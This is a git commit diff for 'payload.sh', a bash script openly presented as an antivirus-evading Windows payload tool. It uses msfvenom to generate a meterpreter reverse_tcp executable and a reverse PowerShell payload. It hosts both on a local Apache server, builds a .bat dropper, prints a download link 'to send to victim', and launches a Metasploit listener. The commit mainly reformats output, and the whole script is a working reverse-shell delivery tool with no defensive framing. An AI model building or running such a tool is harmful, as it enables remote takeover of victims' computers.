794e9c51551ec8d3fcdb66a7a558fa35741901f8
Disease <83523587+CPScript@users.noreply.github.com>
2024-10-01 10:14:05 -0400

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,31 +1,23 @@
 #!/bin/bash
+
 cat logo.txt
-printf "
+echo "| windows anti anit-virus PAYLOAD - CPScript |"
+sleep 2
 
-                                                          \e[189m\e[1;99m|  A <full name> PAYLOAD  | \e[0m\n"
-
-printf "                                                                                                                                                                                                                                                                                                                      \e[189m\e[1;99m WELCOME TO IGNITETCH FUD TOOL \e[0m\n"
-sleep 10
-
-
-
-
-
-
-
-printf " \e[189m\e[1;73m Enter the Port [Eg. 4444] \e[0m\n"
-echo ""
+echo "Enter Port [Example: 4444]:"
 read port
-printf " \e[189m\e[1;73m Enter the Lhost \e[0m\n"
-echo ""
+
+echo " Enter the Lhost:"
 read lhost
-printf " \e[189m\e[1;73m Enter the Payload Name \e[0m\n"
-echo ""
+
+echo "Enter the Payload Name:"
 read name
-printf "                                                                  \e[101m\e[1;73m WAIT PAYlOAD IS RUNNING \e[0m\n" 
+
+echo "                                                                  WAIT PAYlOAD IS RUNNING" 
 msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$port -f exe > $name.exe
-printf " \e[189m\e[1;73m Enter the Backup Payload Name [Different] \e[0m\n"
+
 echo ""
+echo " Enter the Backup Payload Name:"
 read backup
 msfvenom -p cmd/windows/reverse_powershell lhost=$lhost lport=$port > $backup.sh
 systemctl start apache2
@@ -34,14 +26,12 @@ mv /var/www/html/index.html /var/www/
 mv $name.exe /var/www/html/
 mv $backup.sh /var/www/html/
 echo ""
-printf " \e[210m\e[1;73m; Enter One More Diffrent Payload Name \e[0m\n"
-echo ""
+echo " Enter One More Diffrent Payload Name"
 read payload
 sed -e "s/\$ip/$lhost/" -e "s/\$name/$name/" -e "s/\$lhost/$lhost/" -e "s/\$backup/$backup/" requirements.txt > $payload.bat
 sudo mv $payload.bat /var/www/html/
-printf "                                                 \e[189m\e[1;99m       Send the Link +++++ http://$lhost/$payload.bat \e[0m\n"
+echo ""
+echo "                                                        payload link(send to victim): http://$lhost/$payload.bat"
  
-printf "                                                                                                                                                                                                                                                                                                                                                                                                                                      \e[101m\e[1;73m WAIT METASPLOIT RUNNING \e[0m\n"
-sleep 10
 sed -e "s/\$lhost/$lhost/" meterpreter.rc > $name.rc
 msfconsole -r $name.rc
